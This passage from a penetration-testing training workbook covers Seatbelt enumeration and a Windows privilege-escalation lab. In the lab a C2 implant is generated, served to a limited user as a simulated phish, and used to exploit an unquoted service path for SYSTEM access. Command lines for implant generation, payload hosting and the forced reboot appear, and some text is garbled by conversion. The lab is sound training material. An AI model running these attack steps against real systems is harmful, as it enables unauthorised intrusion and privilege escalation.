 192.168.188.145:19910 20.59.87.225:443 ESTAB 3424 WpnService C:
\WINDOWS\system32\svchost.exe -k netsvcs -p -s WpnService
 192.168.188.145:20738 192.168.188.128:443 ESTAB 12256 
symbols.exe
 192.168.188.145:20739 192.168.188.128:443 ESTAB 11340 
symbols.exe
```

The details of each system may differ.

[\*] Completed collection in 0.097 seconds

#### *3: Groups*

Instead of running individual commands, we can launch groups of commands. The command groups currently supported by Seatbelt are:

- All all commands •
- User scans the current user, or for all users if the current user has administrative privileges. •
- System mines interesting data about the target system •
- Slack modules designed to extract information about Slack (is it installed, downloads, and workspaces) •
- Chromium extracts information regarding Chromium-based browsers (are they installed, bookmarks, history) •
- Remote checks that work on remote systems (very interesting before any lateral movement) •
- Misc miscellaneous checks •

Let's take a look at our system and analyze the results of the *System* group.

seatbelt -group=system

#### Expected Results

====== AppLocker ======

[\*] AppIDSvc service is Running

 [\*] AppLocker not configured ====== ARPTable ======

Loopback Pseudo-Interface 1 --- Index 1

Interface Description : Software Loopback Interface 1

Interface IPs : ::1, 127.0.0.1

DNS Servers : fec0:0:0:ffff::1%1, fec0:0:0:ffff::2%1, fec0:0:0:ffff::3%1

 Internet Address Physical Address Type 224.0.0.22 00-00-00-00-00-00 Static 239.255.255.250 00-00-00-00-00-00 Static

Ethernet0 --- Index 2

 Interface Description : Intel(R) PRO/1000 MT Network Connection Interface IPs : fe80::3223:ec41:d5cd:e583%9, 192.168.188.145

DNS Servers : 192.168.188.2

 Internet Address Physical Address Type 192.168.36.2 00-00-00-00-00-00 Invalid 192.168.188.1 00-50-56-C0-00-08 Dynamic 192.168.188.2 00-50-56-E8-8E-F5 Dynamic 192.168.188.128 00-0C-29-19-4A-49 Dynamic 192.168.188.142 00-0C-29-67-B5-B4 Dynamic 192.168.188.143 00-0C-29-7B-AF-E9 Dynamic 192.168.188.254 00-50-56-E6-D9-BE Dynamic 192.168.188.255 FF-FF-FF-FF-FF-FF Static 224.0.0.22 01-00-5E-00-00-16 Static 224.0.0.251 01-00-5E-00-00-FB Static 224.0.0.252 01-00-5E-00-00-FC Static 239.255.255.250 01-00-5E-7F-FF-FA Static 255.255.255.255 FF-FF-FF-FF-FF-FF Static

...truncated for brevity...

The details of each system may differ.

#### This group runs 55 different commands, including:

- AMSIProviders •
- AntiVirus •
- AppLocker •
- ARPTable •
- AuditPolicies •
- AuditSettings •
- AutoRuns •
- CredGuard •
- DNSCache •
- DotNet •
- EnvironmentPath •
- EnvironmentVariables •
- InterestingProcesses •
- InternetSettings •
- LAPS •
- LastShutdown •
- LocalGPOs •
- LocalGroups •
- LocalUsers •
- LogonSessions •
- LSASettings •
- NamedPipes •
- NetworkProfiles •
- NetworkShares •
- NTLMSettings •
- OSInfo •
- PoweredOnEvents •
- PowerShell •
- Processes •
- PSSessionSettings •
- RDPSessions •
- SCCM •
- Services •

- Sysmon •
- TcpConnections •
- TokenPrivileges •
- UAC •
- UdpConnections •
- UserRightAssignments •
- WindowsAutoLogon •
- WindowsDefender •
- WindowsEventForwarding •
- WindowsFirewall •
- WMIEventConsumer •
- WMIEventFilter •
- WMIFilterBinding •
- WSUS •

This is a quick way to get a lot of data about the target system for o ffline analysis. Let's take a quick look at a few of the interesting commands and how they might be useful.

- AutoRuns Maybe the executables or their configurations can be modified for persistence or privilege escalation •
- InterestingProcesses Useful to understand the defensive and administration tools installed on the system •
- LocalGroups and LocalUsers These could be used for escalation or persistence •
- LogonSessions This is a list of currently logged on users. We could possibly use their access for lateral movement or privilege escalation. •
- NetworkShares Is our system sharing useful information that others might want/need? Could we add or replace files to gain access to another user or computer? •
- PowerShell This command lets us know if defensive technologies for PowerShell are enabled. If they are not enabled, we might be able to use PowerShell tools. If the defenses are enabled, then it may be best to avoid PowerShell so we don't trigger alerts. •

#### *4: Remote Usage*

We can use Seatbelt to learn about a target *before* we attempt to exploit it or laterally move to the target. Windows will automatically pass through our current user token, or we can specify a username and password with -username and -password.

Remember that we found several working credentials in our earlier password guessing. We'll use bgreen/ Password1 to query another system for information on the system.

Recall that commands that can be run remotely are prefixed with a + . Let's look at the commands we can run remotely to get information from another hosts.

| Seatbelt   findstr + |
|----------------------|
| seatbelt   findstr + |
| seatbelt   findstr + |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |
|                      |

#### Expected Results

#### C:\Users\sec560> seatbelt | findstr + Available commands (+ means remote usage is supported): + AMSIProviders - Providers registered for AMSI + AntiVirus - Registered antivirus (via WMI) + AppLocker - AppLocker settings, if installed + AuditPolicyRegistry - Audit settings via the registry + AutoRuns - Auto run executables/scripts/programs + ChromiumBookmarks - Parses any found Chrome/Edge/Brave/Opera bookmark files + ChromiumHistory - Parses any found Chrome/Edge/Brave/Opera history files + ChromiumPresence - Checks if interesting Chrome/Edge/Brave/Opera files exist + CloudCredentials - AWS/Google/Azure/Bluemix cloud credential files + CloudSyncProviders - All configured Office 365 endpoints (tenants and teamsites) which are synchronised by OneDrive. + CredGuard - CredentialGuard configuration + DNSCache - DNS cache entries (via WMI) + DotNet - DotNet versions + DpapiMasterKeys - List DPAPI master keys + EnvironmentVariables - Current environment variables + ExplicitLogonEvents - Explicit Logon events (Event ID 4648) from the security event log. Default of 7 days, argument == last X days. + ExplorerRunCommands - Recent Explorer "run" commands + FileZilla - FileZilla configuration files + FirefoxHistory - Parses any found FireFox history files + FirefoxPresence - Checks if interesting Firefox files exist + Hotfixes - Installed hotfixes (via WMI) + IEFavorites - Internet Explorer favorites + IEUrls - Internet Explorer typed URLs (last 7 days, argument == last X days) + InstalledProducts - Installed products via the registry + InterestingProcesses - "Interesting" processes - defensive products and admin tools + KeePass - Finds KeePass configuration files + LAPS - LAPS settings, if installed + LastShutdown - Returns the DateTime of the last system shutdown (via the registry). + LocalGroups - Non-empty local groups, "-full" displays all groups (argument == computername to enumerate) + LocalUsers - Local users, whether they're active/disabled, and pwd last set (argument == computername to enumerate) + LogonEvents - Logon events (Event ID 4624) from the security event log. Default of 10 days, argument == last X days. + LogonSessions - Windows logon sessions + LSASettings - LSA settings (including auth packages) + MappedDrives - Users' mapped drives (via WMI) + NetworkProfiles - Windows network profiles + NetworkShares - Network shares exposed by the machine (via WMI) + NTLMSettings - NTLM authentication settings + OptionalFeatures - List Optional Features/Roles (via WMI)

```
 + OSInfo - Basic OS info (i.e. architecture, OS version, etc.)
 + OutlookDownloads - List files downloaded by Outlook
 + PoweredOnEvents - Reboot and sleep schedule based on the System event log 
EIDs 1, 12, 13, 42, and 6008. Default of 7 days, argument == last X days.
 + PowerShell - PowerShell versions and security settings
 + PowerShellEvents - PowerShell script block logs (4104) with sensitive data.
 + PowerShellHistory - Searches PowerShell console history files for sensitive 
regex matches.
 + ProcessCreationEvents - Process creation logs (4688) with sensitive data.
 + ProcessOwners - Running non-session 0 process list with owners. For remote 
use.
 + PSSessionSettings - Enumerates PS Session Settings from the registry
 + PuttyHostKeys - Saved Putty SSH host keys
 + PuttySessions - Saved Putty configuration (interesting fields) and SSH 
host keys
 + RDPSavedConnections - Saved RDP connections stored in the registry
 + RDPSessions - Current incoming RDP sessions (argument == computername to 
enumerate)
 + RDPsettings - Remote Desktop Server/Client Settings
 + SCCM - System Center Configuration Manager (SCCM) settings, if 
applicable
 + ScheduledTasks - Scheduled tasks (via WMI) that aren't authored by 
'Microsoft', "-full" dumps all Scheduled tasks
 + SlackDownloads - Parses any found 'slack-downloads' files
 + SlackPresence - Checks if interesting Slack files exist
 + SlackWorkspaces - Parses any found 'slack-workspaces' files
 + SuperPutty - SuperPutty configuration files
 + Sysmon - Sysmon configuration from the registry
 + SysmonEvents - Sysmon process creation logs (1) with sensitive data.
 + UAC - UAC system policies via the registry
 + WindowsAutoLogon - Registry autologon information
 + WindowsDefender - Windows Defender settings (including exclusion locations)
 + WindowsEventForwarding - Windows Event Forwarding (WEF) settings via the registry
 + WindowsFirewall - Non-standard firewall rules, "-full" dumps all (arguments 
== allow/deny/tcp/udp/in/out/domain/private/public)
 + WMI - Runs a specified WMI query
 + WSUS - Windows Server Update Services (WSUS) settings, if 
applicable
```

Let's run the UAC module against the 10.130.10.25 system.

seatbelt UAC -computername=10.130.10.25 -username=hiboxy\bgreen -password=Password1

#### Expected Results

C:\Users\sec560> seatbelt UAC -computername=10.130.10.25 -username=hiboxy\bgreen password=Password1

[\*] Running commands remotely against the host '10.130.10.25' with credentials -> user:hiboxy\bgreen , password:Password1

[...trimmed ASCII art...] ====== UAC ======

ConsentPromptBehaviorAdmin : 5 - PromptForNonWindowsBinaries

EnableLUA (Is UAC enabled?) : 1

LocalAccountTokenFilterPolicy :

 FilterAdministratorToken : [\*] Default Windows settings - Only the RID-500 local admin account can be used for lateral movement.

[\*] Completed collection in 0.292 seconds

We can see there that UAC is enabled, and that we need the built-in Administrator account (RID 500) for lateral movement if using a local account.

If you have more time, run some of the other modules against this remote system.

#### Conclusions

Seatbelt is useful to perform checks on a local system as well as remote systems. The checks are designed to find issues that are most useful to a penetration tester.

## *Lab 3.6: Windows Privilege Escalation*

#### No VPN Required

This exercise does not require an OpenVPN connection. Internet access is required.

#### Objectives

•

PowerUp.ps1 •

- Use Sharpup to find local privilege escalation issues •
- We will abuse a Windows service configuration issue to escalate local privileges •

#### Lab Setup

VM used:

- Linux •
- Windows •

You'll need to have both your Linux and Windows VM booted for this lab.

#### If you've run this lab before, run these commands

Let's make sure there aren't artifacts left over from your previous run of the lab. Logged into your Windows VM as the sec560 user, open a PowerShell terminal by clicking Terminal icon on the desktop. Then enter the following commands:

#### Command

Set-Service -Name'Video Stream' -StartupType Manual Stop-Service -Name'Video Stream' -Force -ErrorAction SilentlyContinue Get-Process -Name'1337' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue

Remove-Item'C:\Program Files\VideoStream\1337.exe' -Force -ErrorAction SilentlyContinue Set-Service -Name'Video Stream' -StartupType Automatic -ErrorAction Stop Get-Service -Name"Video Stream" | Select-Object -Property Status,StartupType

#### Expected Results

PS C:\Users\sec560> Set-Service -Name 'Video Stream' -StartupType Manual PS C:\Users\sec560> Stop-Service -Name 'Video Stream' -Force -ErrorAction SilentlyContinue PS C:\Users\sec560> Get-Process -Name '1337' -ErrorAction SilentlyContinue | Stop-Process -Force -

ErrorAction SilentlyContinue

PS C:\Users\sec560> Remove-Item 'C:\Program Files\VideoStream\1337.exe' -Force -ErrorAction SilentlyContinue

PS C:\Users\sec560> Set-Service -Name 'Video Stream' -StartupType Automatic -ErrorAction Stop PS C:\Users\sec560> Get-Service -Name "Video Stream" | Select-Object -Property Status,StartupType

Status StartupType

------ -----------

Stopped Automatic

#### Lab – Step-by-Step Instructions

install.exe and host it with the Python

web server. We'll keep the instructions direct, and to the point since you've performed these steps multiple times while doing Labs 3.3 and 3.4. If any of these instructions are not familiar, we suggest you review those labs after the conclusion of this one.

If you need to be reminded how to configuration operators...

in the Multiplayer Mode step.

![](SEC560_WorkBook1_page_309_Figure_0.jpeg)

![](SEC560_WorkBook1_page_309_Figure_1.jpeg)

Start an HTTPS listener.

![](SEC560_WorkBook1_page_310_Figure_0.jpeg)

Now, let's generate a payload. We'll call it install.exe . You'll download this in a moment as the notadmin user to simulate the user falling for a fake installer or phishing campaign.

generate --skip-symbols --name install --http LINUX\_ETH0\_IP

Replace LINUX\_ETH0\_IP with your actual IP address.

#### Expected Results

- [\*] Generating new windows/amd64 implant binary
- [!] Symbol obfuscation is disabled
- [\*] Build completed in 3s
- [\*] Implant saved to /home/sec560/install.exe

#### Getting ' [ ! ] rpc error: Unknown desc =...' ?

If you receive an rpc error , it's most often caused by attempting to create two implants with the same name. If you are repeating this lab or ran this command more than once, there is already a install . You can verify by running implants and looking for install in the output. Either delete the original with implants rm install , or pick a different name for this payload, like patch.

- [\*] Generating new windows/amd64 implant binary
- [!] Symbol obfuscation is disabled
- [!] rpc error: code = Unknown desc = UNIQUE constraint failed: implant\_builds.name

In a new terminal, change the permission of the payload to allow others to read it, and move it to /tmp . Then start a Python web server to serve files in /tmp .

```
chmodo+r install.exe &&mv install.exe /tmp/
python3 -m http.server -d /tmp
```

#### Expected Results

```
sec560@560vm:~$ chmodo+r install.exe &&mv install.exe /tmp/
sec560@560vm:~$ python3 -m http.server -d /tmp
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

#### *2: Log on to Windows and Run the Payload*

Now, switch over to your Windows system. We'll be logging on to Windows as a limited user, with the username and password of notadmin and notadmin, respectively. Remember that the password is the same as the username, since you'll likely be closing the browser window with the lab instructions.

You are likely logged in as sec560. If so, log out of Windows. Click the Start menu, click the head and shoulders in the lower-left, click the ellipses ( ... ), then click "Sign out".

Log on to the Windows machine with the below credentials:

Username: notadmin •

Password: notadmin •

This is a standard user without admin privileges. We are not using the sec560 account because sec560 already has local admin privileges.

You are only running two commands on the Windows system, but if you'd like to use the EWB as notadmin, you can browse to http://localhost/workbook/ . You will need to go through the "new user" process for the browser you choose.

After logging in, we need to grab our payload. To retrieve it, we need to open a terminal. Right click on the Start menu, and then select Windows PowerShell.

![](SEC560_WorkBook1_page_313_Picture_0.jpeg)

Once you have a terminal, use curl to download the payload and then run it.

![](SEC560_WorkBook1_page_313_Figure_2.jpeg)

Congratulations! Notadmin fell for your phish, and you compromised your Windows VM...again! Now that we have downloaded

this:

#### Expected Results

[\*] Session 8aaf2873 install - 192.168.188.146:17247 (SEC560-Windows) - windows/amd64 - Wed, 24 Sep 2025 18:33:00 UTC

#### *3: Check Your Privileges*

Let's use 8a to the first characters of your session ID.

#### Command

use 8a

#### Expected Results

[\*] Active session install (8aaf2873-b6bd-40bb-a497-d7818c54210a)

We can use whoami to validate the user that ran our payload, and getprivs to determine how much access the user has on the system. These are extremely helpful when you get shells on a penetration test, but you don't know who actually launched the payload.

whoami getprivs

#### Expected Results

Logon ID: SEC560-WINDOWS\notadmin

[\*] Current Token ID: SEC560-WINDOWS\notadmin

Privilege Information for install.exe (PID: 9000)

-------------------------------------------------

Process Integrity Level: Medium

Name Description Attributes ==== =========== ==========

SeShutdownPrivilege Shut down the system Disabled

SeChangeNotifyPrivilege Bypass traverse checking Enabled, Enabled

by Default

SeUndockPrivilege Remove computer from docking station Disabled SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

SeTimeZonePrivilege Change the time zone Disable

We can see the session is running as SEC560-WINDOWS\notadmin . The getprivs output is what we expect to see for a normal user. If this were an admin account, the list of privileges would be *much* longer. Let's escalate some privileges.

#### *4: Install and Run SharpUp*

PowerSploit includes a pure PowerShell script called PowerUp.ps1. It runs a series of checks looking for privilege escalation opportunities. We're going to use SharpUp, which is a .Net implementation of the PowerUp.ps1 Armory.

#### Apple silicon users...

If you are using an Apple silicon system, you'll need to background armory commands, you will need to use your session again.

![](SEC560_WorkBook1_page_316_Figure_0.jpeg)

Great! Let's install it with armory install .

![](SEC560_WorkBook1_page_316_Figure_2.jpeg)

alias execute-

assembly. So, just like we needed specify -i or -p when we used execute-assembly, we'll need to do the same with SharpUp. Let's see what it can do.

![](SEC560_WorkBook1_page_316_Figure_5.jpeg)

| Command    |  |  |
|------------|--|--|
|            |  |  |
| sharpup -i |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |
|            |  |  |

#### Expected Results

#### [\*] sharpup output:

SharpUp.exe [audit] [check1] [check2]...

 audit - Specifies whether or not to enable audit mode. If enabled, SharpUp will run vulenrability checks

 regardless if the process is in high integrity or the user is in the local administrator's group.

 If no checks are specified, audit will run all checks. Otherwise, each check following audit will

be ran.

check\* - The individual vulnerability check to be ran. Must be one of the following:

- AlwaysInstallElevated
- CachedGPPPassword
- DomainGPPPassword
- HijackablePaths
- McAfeeSitelistFiles
- ModifiableScheduledTaskFile
- ModifiableServiceBinaries
- ModifiableServiceRegistryKeys
- ModifiableServices
- ProcessDLLHijack
- RegistryAutoLogons
- RegistryAutoruns
- TokenPrivileges
- UnattendedInstallFiles
- UnquotedServicePath

#### Examples:

SharpUp.exe audit

 -> Runs all vulnerability checks regardless of integrity level or group membership.

#### SharpUp.exe HijackablePaths

-> Check only if there are modifiable paths in the user's %PATH% variable.

#### SharpUp.exe audit HijackablePaths

 -> Check only for modifiable paths in the user's %PATH% regardless of integrity level or group membership.

the MethodInfo::Invoke\_3 method returned an error:

The system cannot find the file specified.

The basic output from SharpUp gives you the simple syntax of audit to run all the checks, or check <NameOfCheck>. Let's run a full audit. It should only take around 10 seconds to run.

#### Command

sharpup -i audit

#### Expected Results

[\*] sharpup output:

=== SharpUp: Running Privilege Escalation Checks ===

[!] Modifialbe scheduled tasks were not evaluated due to permissions.

Registry AutoLogon Found

[+] Hijackable DLL: C:\Users\notadmin\AppData\Local\Microsoft\Edge\User Data\Domain

Actions\3.0.0.16\domain\_actions.dll

[+] Associated Process is msedge with PID 7064

[+] Hijackable DLL: C:\Users\notadmin\AppData\Local\Microsoft\Edge\User Data\Well Known

Domains\1.2.0.0\well\_known\_domains.dll

[+] Associated Process is msedge with PID 7064

=== Registry AutoLogons ===

DefaultDomainName:

DefaultUserName: sec560

DefaultPassword: sec560

AltDefaultDomainName:

AltDefaultUserName:

AltDefaultPassword:

#### === Services with Unquoted Paths ===

 Service 'Video Stream' (StartMode: Automatic) has executable 'C:\Program Files\VideoStream\1337 Log\checklog.exe', but 'C:\Program Files\VideoStream\1337' is modifable.

=== Modifiable Service Binaries ===

 Service 'Video Stream' (State: Running, StartMode: Auto) : C:\Program Files\VideoStream\1337 Log\checklog.exe

[\*] Completed Privesc Checks in 10 seconds

In the results, you can see a few different issues. First, it highlights a couple [+] Hijackable DLL issues. Those are great, but you'll notice in the output that they are in Notadmin's AppData folder. That wouldn't help us.

#### If you don't see ' [ + ] Hijackable DLL' in your results

It's nothing to worry about. Those files won't exist if you didn't open Edge as Notadmin.

SharpUp also found the autologon credentials stored in the registry. You won't see credentials like that very often on corporate machines, but when you do, you've likely found a kiosk of some sort. (Those are always fun.)

It then calls out two different issues.

- Services with Unquoted Paths 1.
- Modifiable Service Binaries 2.

We're most interested in "Services with Unquoted Paths" because "Modifiable Service Binaries" would require us to overwrite the service binary. If we were to go that route, we'd need to backup the original binary so the service could be easily restored after the attack. In our case, the service is running, which puts a lock on the file, and we'd need admin permissions to stop the service to overwrite the file. It's one of the many "chicken and the egg" situations we regularly encounter as penetration testers.

The "Services with Unquoted Paths" is exactly what we need, though. The space in the folder named 1337 log gives us an opening. Remember from class that if Windows is told to launch a program with spaces in the file path, it doesn't know what is part of the file path and what is an argument for the program. Since it doesn't know, it tries every combination, start with the assumption the spaces delimit arguments. It's going to eventually try C:\Program Files\VideoStream\1337.exe as a program, and we're going to make sure it finds it.

#### *5: Generate 1337.exe*

generate's parameters this time so you are aware of

#### them:

- -l This is the short version of --skip-symbols that we've been using to speed up the commands. (This is your reminder that you *shouldn't* use this in regular engagement...unless you want to get caught.) •
- -b LINUX\_ETH0\_IP This is the shortened version of the --http parameter, which is how we tell the payload where to phone home. •
- -f service This is the short form of --format . We are specifying service so our payload isn't killed by the Service Controller 30 seconds after we get the session. •
- -N 1337 This is the short version of --name. Specifying 1337 means it will create a service binary called 1337.exe, which is exactly what we need. •

#### Apple silicon users...

If you are using an Apple silicon system, you'll need to background your session to use generate. After generating the payload, you will need to use your session again.

# Command Replace LINUX\_ETH0\_IP with your actual IP address. generate -l -b LINUX\_ETH0\_IP-f service -N 1337 Expected Results [\*] Generating new windows/amd64 implant binary [!] Symbol obfuscation is disabled [\*] Build completed in 3s [\*] Implant saved to /home/sec560/1337.exe

Good work! Now let's put that payload to work! We'll change directories into C:\Program Files\VideoStream\ , and then upload the payload.

![](SEC560_WorkBook1_page_321_Figure_2.jpeg)

![](SEC560_WorkBook1_page_321_Figure_3.jpeg)

We're so close now! At this point, we just need to stop and start the service. I know what you're thinking...

*I thought we didn't have the permissions necessary to do that?*

You're right! Sort of...

We don't have the permissions necessary to stop and start a *specific* service, but we do have the ability to restart *all the services*! How you ask? Reboot! I mean, it fixes everything, right? Even low privileged shells!

Notadmin can reboot the system, which is su fficient. In a real test we may wait for a scheduled reboot or service restart; in the lab we'll force it with the shutdown command.

#### *6: Setting Up A Reaction*

Before we force the reboot, let's set up a reaction

when a defined event occurs. We're going to configure one to run whoami against each new session. That way when we get our shell, we'll instantly know what level of access we've attained. We should see NT AUTHORITY\SYSTEM.

#### Apple silicon users...

If you are using an Apple silicon system, you'll need to background your session to use reaction . After configuring your reaction , you will need to use your session again.

reaction set --event session-connected

#### Expected Results

[\*] Setting reaction to: Session Opened

? Enter commands: [Enter 2 empty lines to finish]

Your cursor should be to the right of finish] . Type whoami and then press Enter three times

whoami

#### Expected Results

? Enter commands: [Enter 2 empty lines to finish]whoami

? Enter commands: whoami

[\*] Set reaction to session-connected (id: 1)

#### *7: Reboot*

Great! As they say in Germany, "Reboot tut gut!" (It's pronounced so they all rhyme, and you can even buy t-shirts with the saying.)

![](SEC560_WorkBook1_page_323_Figure_13.jpeg)

Remember to use your session again before executing the next set of commands.

executeC:/Windows/System32/shutdown.exe /r /f /t 0

#### Expected Results

- [\*] Command executed successfully
- [\*] Session 04d6990d 1337 192.168.188.146:49682 (SEC560-Windows) windows/amd64 Wed, 24 Sep 2025 20:05:47 UTC
- [\*] Execute reaction: 'whoami'

NT AUTHORITY\SYSTEM

Congratulations! We have escalated from a limited user without admin privileges to NT AUTHORITY\SYSTEM! You can't get higher level permissions that on a local system! A whole new series of attacks are now available, such as dumping hashes, new types of persistence, etc. While not all penetration test goals require administrative privileges, administrative privileges are nonetheless often useful - especially when performed against RDP servers that allow all users to log in remotely.

#### Conclusion & Cleanup

We identified how local privilege escalation vulnerabilities can be detected and exploited using PowerUp. Using these tools, we were able to escalate our privileges and create a new user on the system with administrative privileges.

Before you go, we recommend you run the cleanup commands as an administrator on your Windows VM:

```
Set-Service -Name'Video Stream' -StartupType Manual
Stop-Service -Name'Video Stream' -Force -ErrorAction SilentlyContinue
Get-Process -Name'1337' -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction
SilentlyContinue
Remove-Item'C:\Program Files\VideoStream\1337.exe' -Force -ErrorAction SilentlyContinue
Set-Service -Name'Video Stream' -StartupType Automatic -ErrorAction Stop
Get-Service -Name"Video Stream" | Select-Object -Property Status,StartupType
```

#### Expected Results

PS C:\Users\sec560> Set-Service -Name 'Video Stream' -StartupType Manual PS C:\Users\sec560> Stop-Service -Name 'Video Stream' -Force -ErrorAction SilentlyContinue PS C:\Users\sec560> Get-Process -Name '1337' -ErrorAction SilentlyContinue | Stop-Process -Force - ErrorAction SilentlyContinue PS C:\Users\sec560> Remove-Item 'C:\Program Files\VideoStream\1337.exe' -Force -ErrorAction SilentlyContinue PS C:\Users\sec560> Set-Service -Name 'Video Stream' -StartupType Automatic -ErrorAction Stop PS C:\Users\sec560> Get-Service -Name "Video Stream" | Select-Object -Property Status,StartupType Status StartupType ------ ----------- Stopped Automatic